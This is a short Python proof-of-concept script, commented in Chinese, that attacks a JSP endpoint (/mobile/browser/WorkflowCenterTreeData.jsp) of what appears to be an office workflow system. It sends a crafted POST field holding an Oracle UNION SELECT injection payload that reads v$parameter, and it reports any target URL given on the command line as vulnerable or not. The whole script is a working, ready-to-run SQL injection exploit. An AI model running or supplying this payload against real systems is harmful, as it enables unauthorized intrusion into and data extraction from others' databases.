

import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/mobile/browser/WorkflowCenterTreeData.jsp，参数是uid和method',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/mobile/browser/WorkflowCenterTreeData.jsp"  # 移除末尾的斜杠
    else:
        url = args.url + "/mobile/browser/WorkflowCenterTreeData.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

data = {'formids': '11111111111)))\r\n\r\n\r\n\r\n\r\n\r\n...\r\n\r\nunion select NULL,instance_name from v$parameter order by (((1'}

response = requests.post(url, headers=headers, data=data)
if "ADDRESS" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)
